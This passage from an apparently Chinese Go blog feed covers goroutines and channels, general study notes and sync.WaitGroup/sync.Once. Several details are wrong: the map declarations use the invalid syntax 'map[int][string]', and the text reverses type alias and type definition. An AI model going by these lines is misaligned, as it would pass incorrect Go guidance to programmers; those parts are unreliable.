循环里面，就没有出来过，所以服务压根就没有启动。</p><p>那么有没有什么办法，既可以保证服务正常启动，同时又可以执行 keepPrinting 函数？</p><p>答案是有的，那就是“创建”一个 goroutine，由这个 goroutine 去执行 keepPrinting 函数。</p><p>因此，上面的示例代码就变成了这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">"/hello"</span>, hello)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> keepPrinting()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"App runs on port 9999."</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">":9999"</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行更新之后的示例代码，会发现终端同样一直有输出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243979</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243980</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243981</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243982</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243983</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>访问一下 Web 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -I http://localhost:9999/hello</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><p>状态码是 200，说明服务已经启动了。</p><p>现在虽然达到了上面的预期结果，但是终端输出的内容太多了，导致其他重要的内容容易一下子被“冲走了”。</p><p>那么有没有什么办法，可以限制一下输出，只在服务端收到来自客户端的请求时，才会去打印。</p><p>当然是可以的，这里就要借助 channel 了。</p><p>对上面的示例代码进行改造：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> ch <span class="keyword">chan</span> <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">ch &lt;- req.URL.Path</span><br><span class="line">fmt.Fprintln(w, <span class="string">"hello go"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="comment">// 两种都可以使用</span></span><br><span class="line"><span class="comment">// ch = make(chan string)</span></span><br><span class="line">  ch = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">1</span>)</span><br><span class="line">http.HandleFunc(<span class="string">"/hello"</span>, hello)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">go</span> keepPrinting()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"App runs on port 9999."</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">":9999"</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">keepPrinting</span><span class="params">()</span></span> &#123;</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">i++</span><br><span class="line">log.Println(<span class="string">"i = "</span>, i)</span><br><span class="line">url := &lt;-ch</span><br><span class="line">log.Println(<span class="string">"URL.Path = "</span>, url)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次执行示例代码，启动 Web 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">App runs on port 9999.</span><br><span class="line">2022/11/25 10:55:22 i =  1</span><br></pre></td></tr></table></figure><p>终端访问 Web 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -I http://localhost:9999/hello</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><p>控制台继续输出如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2022/11/25 10:55:56 URL.Path =  /hello</span><br><span class="line">2022/11/25 10:55:56 i =  2</span><br></pre></td></tr></table></figure><p>这里这个示例，无论是使用无缓冲 channel还是有缓冲 channel，其效果都是一样的。</p><ol><li>使用无缓冲 channel 时，对无缓冲 channel 的接收和发送操作是同步的，只有同时具备接收和发送能力才会继续往下执行。</li><li>使用有缓冲 channel 时，因为在缓冲带已空的情况下，对它的所有接收操作都会被阻塞，因此效果上和使用无缓冲 channel 是一样的。</li></ol><p>当没有新的请求进来时，也就是没有对 channel 进行发送操作，goroutine 会一直阻塞在 <code>url := &lt;-ch</code> 对 channel 的接收操作上。</p><p>一旦新的请求进来了，也就是对 channel 进行发送操作了，此时 goroutine 通过接收操作拿到了数据，因此继续往下执行。</p><p>goroutine 再次重新进入 for 循环，阻塞等待，重复上面的逻辑。</p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言零散学习笔记</title>
      <link href="/go-language-study-notes/"/>
      <url>/go-language-study-notes/</url>
      
        <content type="html"><![CDATA[<p>Go 语言学习零散笔记整理。</p><a id="more"></a><h2 id="零值初始化"><a href="#零值初始化" class="headerlink" title="零值初始化"></a>零值初始化</h2><p>同样是声明一个切片，这两种方式有什么区别？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sl1 这个变量声明了，还没初始化，是 nil 值，和nil比较返回true，底层没有分配内存空间</span></span><br><span class="line"><span class="keyword">var</span> sl1 []<span class="keyword">int</span>            </span><br><span class="line"></span><br><span class="line"><span class="comment">// sl2 这个变量声明且初始化了，不是nil值，和nil比较返回false，底层分配了内存空间，有地址</span></span><br><span class="line"><span class="keyword">var</span> sl2 = []<span class="keyword">int</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>同样是声明一个 map，这两种方式有什么区别？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量 m1 只是声明了但是没有初始化，默认值为 nil，这个时候如果直接对 map 进行赋值，则会导致运行时异常</span></span><br><span class="line"><span class="keyword">var</span> m1 <span class="keyword">map</span>[<span class="keyword">int</span>][<span class="keyword">string</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量 m2 声明且初始化了</span></span><br><span class="line">m2 := <span class="keyword">map</span>[<span class="keyword">int</span>][<span class="keyword">string</span>]&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一种初始化方式</span></span><br><span class="line">m1 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>][<span class="keyword">string</span>])</span><br></pre></td></tr></table></figure><p>因此在使用 map 之前，必须先对其进行初始化。</p><h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><p>Go 语言的基本数据类型中，map、slice、channel 这些都是引用类型。</p><p>引用类型的特点是，赋值时，不是值传递而是引用传递。</p><p>下面通过一个示例来理解：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">m1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">m2 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">m2 = m1</span><br><span class="line"></span><br><span class="line">m1[<span class="number">1</span>] = <span class="number">99</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> m2 &#123;</span><br><span class="line">fmt.Println(v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> i2 <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">i2 = i1</span><br><span class="line">i1 = <span class="number">99</span></span><br><span class="line">fmt.Println(i2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">99</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>符合预期。</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>首先明确一个前提：错误不是异常。</p><p>常见的错误处理方法是返回 <code>error</code>，由调用者决定后续如何处理。但是如果是无法恢复的错误，通常会触发 <code>panic</code>，程序会因此而无法运行，而这个就是异常。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">err := M()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// do somethings</span></span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">M</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">"some error occurred"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>error</code> 是一个接口，它是 Go 原生内置的类型。</p><p><code>errors</code> 是一个包文件，通常用到它的 <code>errors.New</code> 方法用构造一个错误值，赋值给接口。因此通常把 <code>error</code> 作为返回值类型，<code>errors.New()</code> 作为构造 error 类型的返回值的方式之一，<code>fmt.Errorf()</code> 也可以构造。</p><h2 id="定义一个新类型"><a href="#定义一个新类型" class="headerlink" title="定义一个新类型"></a>定义一个新类型</h2><p><code>type T1 ＝T</code> 和 <code>type T1 T</code> 两个语法本质上有什么区别呢？</p><p>前者是基于类型别名（Type Alias）定义新类型，后者是通过类型声明（Type define）给原类型起别名。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// type alias</span></span><br><span class="line"><span class="keyword">type</span> T = <span class="keyword">string</span>  <span class="comment">// 类型 T1 是基础类型 string 的别名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> s <span class="keyword">string</span> = <span class="string">"hello"</span> </span><br><span class="line">   <span class="keyword">var</span> t T = s <span class="comment">// ok</span></span><br><span class="line">   fmt.Printf(<span class="string">"%T\n"</span>, t) <span class="comment">// string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类型 T 与 string 完全等价。完全等价的意思就是，类型别名并没有定义出新类型，类 T 与 string 实际上就是同一种类型，因此通常会称 <strong>类型 T 是基础类型 string 的别名</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// type define</span></span><br><span class="line"><span class="keyword">type</span> T1 <span class="keyword">int</span>      <span class="comment">// 类型 T1 是基础类型 int 的新类型</span></span><br><span class="line"><span class="keyword">type</span> T2 T1       <span class="comment">// 类型 T1 是自定义类型 T1 的新类型</span></span><br><span class="line"><span class="keyword">type</span> T3 <span class="keyword">string</span>   <span class="comment">// 类型 T3 是基础类型 string 的新类型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> n1 T1</span><br><span class="line">    <span class="keyword">var</span> n2 T2 = <span class="number">5</span></span><br><span class="line">    n1 = T1(n2)  <span class="comment">// ok</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> s T3 = <span class="string">"hello"</span></span><br><span class="line">    n1 = T1(s) <span class="comment">// 错误：cannot convert s (type T3) to type T1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然 T1 和 T2 是不同类型，但因为它们的<strong>底层类型</strong>都是类型 int，所以它们在本质上是相同的。而本质上相同的两个类型，它们的变量可以通过显式转型进行相互赋值，相反，如果本质上是不同的两个类型，它们的变量间连显式转型都不可能，更不要说相互赋值了。</p><p>底层类型这个概念在 Go 语言中有重要作用，通常被用来判断两个类型本质上是否相同（Identical）。</p><h2 id="接口类型不能使用指针"><a href="#接口类型不能使用指针" class="headerlink" title="接口类型不能使用指针"></a>接口类型不能使用指针</h2><p>下面这样的代码很常见，通常使用第三方依赖时，经常会写出这样的代码。可是，有没有想过一个问题？为什么 <code>http.ResponseWriter</code> 是没有带指针的，而 <code>*http.Request</code> 又带了指针？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Context <span class="keyword">struct</span> &#123;</span><br><span class="line">Writer http.ResponseWriter</span><br><span class="line">Req *http.Request </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHanlder</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">"URL.Path = %q \n"</span>, req.URL.Path)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记住一句话：<strong>使用指针可以节省内存，但接口类型不能使用指针</strong>。因此定义结构体、作为函数参数时接口类型都是没有指针的，而结构体类型则需要结合实际情况考虑加不加指针。</p><h2 id="goroutine-共享变量"><a href="#goroutine-共享变量" class="headerlink" title="goroutine 共享变量"></a>goroutine 共享变量</h2><p>下面这段代码，作为 goroutine 运行的闭包会发生什么？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">values := []<span class="keyword">string</span>&#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> values &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(v)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初次使用 goroutine 时，肯定都遇到过这个问题，怎么全部输出的是 c、c、c？</p><p>这是因为变量 v 是一个共享变量，存在竞争状态。有两种解决方案：将变量作为参数传递给闭包和使用中间变量。</p><p>将变量作为参数传递：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> values &#123;</span><br><span class="line">  <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(u <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">      fmt.Println(u)</span><br><span class="line">  &#125;(v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用中间变量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> values &#123;</span><br><span class="line">  v := v</span><br><span class="line">  <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      fmt.Println(v)</span><br><span class="line">  &#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何调试-Go"><a href="#如何调试-Go" class="headerlink" title="如何调试 Go"></a>如何调试 Go</h2><p>如果使用 <a href="https://www.jetbrains.com/go/" target="_blank" rel="noopener">Goland</a> 作为开发工具，那么 Go 程序的调试非常简单，不需要额外安装插件，开箱即用。</p><p>只需要在对应文件位置，打上断点即可。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221117225101.png" alt=""></p><p>如果使用 VsCode 作为开发工具，则需要通过额外安装插件并配置达到调试目的，所以建议直接使用 IDE。</p><hr><p>不过需要注意的是，操作系统需要与对应版本对应上，否则是调试不了的。</p><p>例如，M1 芯片 不支持amd64，如果刚好安装的是 <code>darwin/amd64</code> 版本，则会提示：</p><blockquote><p>Debugging programs compiled with go version go1.18.1 darwin/amd64 is not supported.</p></blockquote><p>解决方案很简单，直接<a href="https://go.dev/dl/" target="_blank" rel="noopener">下载</a>安装 arm64 版本即可。</p><h2 id="如何卸载-Go"><a href="#如何卸载-Go" class="headerlink" title="如何卸载 Go"></a>如何卸载 Go</h2><p>卸载已经按照好的 Go 非常简单，通常只需要三步：</p><ol><li><p>找到Go 二进制文件的位置，通常是 <code>/usr/local/go</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> go</span><br><span class="line">/usr/<span class="built_in">local</span>/go/bin/go</span><br></pre></td></tr></table></figure></li><li><p>删除Golang二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rvf /usr/<span class="built_in">local</span>/go/</span><br></pre></td></tr></table></figure></li><li><p>从 PATH 环境变量中删除 Go 二进制文件所在目录</p></li></ol><p>如果是 macOS，则需要多一步删除 <code>/etc/paths.d/go</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rm -rvf /etc/paths.d/go</span><br></pre></td></tr></table></figure><p>详情可以查看<a href="https://go.dev/doc/manage-install" target="_blank" rel="noopener">官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——sync.WaitGroup和sync.Once</title>
      <link href="/go-language-study-notes-sync-Mutex-and-sync-WaitGroup-and-sync-Once/"/>
      <url>/go-language-study-notes-sync-Mutex-and-sync-WaitGroup-and-sync-Once/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记主要用来介绍 Go 的sync 包的 WaitGroup 类型，它也是并发编程中，经常被用到的一个同步工具。</p><a id="more"></a><h2 id="WaitGroup类型"><a href="#WaitGroup类型" class="headerlink" title="WaitGroup类型"></a>WaitGroup类型</h2><p>sync 包的 WaitGroup 类型（以下简称WaitGroup类型），通常用来实现一对一或者一对多的 goroutine  协作流程。</p><p>WaitGroup类型，也是零值是可用的，因此不需要初始化，开箱即用。</p><p>可以把 WaitGroup 类型理解成是一个计数信号量，用来记录并维护运行的 goroutine。</p><p>WaitGroup类型拥有三个指针方法：</p><ul><li>Add：对 WaitGroup 类型值的增加或者减少计数器的值</li><li>Done：等待 goroutine 执行完成通知 main goroutine</li><li>Wait：阻塞当前的 goroutine，直到其所属值中的计数器归零</li></ul><p>下面通过一段示例代码来加深印象：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明一个 WaitGroup 类型的变量</span></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(id <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Worker %d starting\n"</span>, id)</span><br><span class="line"></span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">fmt.Printf(<span class="string">"Worker %d done\n"</span>, id)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="comment">// 显示 Add 方法，计数器增加 5</span></span><br><span class="line">wg.Add(<span class="number">5</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line"><span class="comment">// 创建中间变量，避免在每个协程闭包中重复利用相同的 i 值</span></span><br><span class="line">i := i</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 通知 WaitGroup 此工作线程已执行完成</span></span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line">worker(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 阻塞，直到 WaitGroup 计数器恢复为 0； 即所有goroutine 都执行完了</span></span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先声明一个全局 WaitGroup 类型的变量，在执行 for 语句之前，显示调用 <code>Add</code> 方法，计数器增加 5，表示有五个即将运行的 goroutine。</p><p>在 for 语句中，每次循环”创建”一个goroutine，一共创建五个。</p><p>如果 WaitGroup 的值大于 0，<code>Wait</code> 方法就会阻塞，因此 main goroutine 就算先执行完成，也不能马上退出程序，必须等待 WaitGroup 计数器恢复为 0。</p><p>一般会在 goroutine 中，配合使用 defer 调用 <code>Done</code>方法，会保证每个 goroutine 一旦执行完成，就调用 <code>Done</code> 方法，通知 WaitGroup 该 goroutine 已执行完成。</p><p>一旦 WaitGroup 计数变为零，main goroutine 就不会被阻塞，从而继续往下执行，程序退出结束。</p><p>执行一下上面的示例代码，看看输出是否符合预期：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Worker <span class="number">5</span> starting</span><br><span class="line">Worker <span class="number">3</span> starting</span><br><span class="line">Worker <span class="number">4</span> starting</span><br><span class="line">Worker <span class="number">1</span> starting</span><br><span class="line">Worker <span class="number">2</span> starting</span><br><span class="line">Worker <span class="number">4</span> done</span><br><span class="line">Worker <span class="number">1</span> done</span><br><span class="line">Worker <span class="number">2</span> done</span><br><span class="line">Worker <span class="number">5</span> done</span><br><span class="line">Worker <span class="number">3</span> done</span><br></pre></td></tr></table></figure><p>符合预期，main goroutine 确实被阻塞了，直到其他 goroutine 都执行完了。</p><h2 id="引发-panic-的情况"><a href="#引发-panic-的情况" class="headerlink" title="引发 panic 的情况"></a>引发 panic 的情况</h2><p>WaitGroup 虽然是开箱即用和并发安全的，但使用时也要注意几点原则，不然可能就引发 panic 了。</p><p>不适当地调用 WaitGroup 的 <code>Done</code> 方法和 <code>Add</code> 方法都可能会导致计数器的值小于零，从而引发 panic：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">panic: sync: negative WaitGroup counter</span><br></pre></td></tr></table></figure><p><code>Add</code> 方法比较好理解，因为可以直接传入负数。</p><p>另外就是 <code>Add</code> 方法的调用，和对 <code>Wait</code> 方法的调用如果是同时发起的，比如，放在不同的 goroutine 中并发执行，那么也有可能会引发 panic。</p><p>虽然这种情况不太容易复现，因此更加需要重视。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221124095832.png" alt=""></p><h2 id="sync-Once"><a href="#sync-Once" class="headerlink" title="sync.Once"></a>sync.Once</h2><p>与sync.WaitGroup类型一样，sync.Once类型（以下简称Once类型）也属于结构体类型，同样也是开箱即用和并发安全的。由于这个类型中包含了一个sync.Mutex类型的字段，所以，复制该类型的值也会导致功能的失效。</p><p>Once类型的 <code>Do</code> 方法只接受一个参数，这个参数的类型必须是<code>func()</code>，即：无参数声明和结果声明的函数。</p><p>该方法的功能并不是对每一种参数函数都只执行一次，而是只执行“首次被调用时传入的”那个函数，并且之后不会再执行任何参数函数。</p><p>所以，如果你有多个只需要执行一次的函数，那么就应该为它们中的每一个都分配一个sync.Once类型的值（以下简称Once值）。</p><p><code>sync.Once</code> 通常用于初始化创建实例等场景。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Redis *RedisClient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConnectRedis</span><span class="params">(address <span class="keyword">string</span>, username <span class="keyword">string</span>, password <span class="keyword">string</span>, db <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">Redis = NewClient(address, username, password, db)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once类型中有一个名叫 done 的 <code>uint32</code> 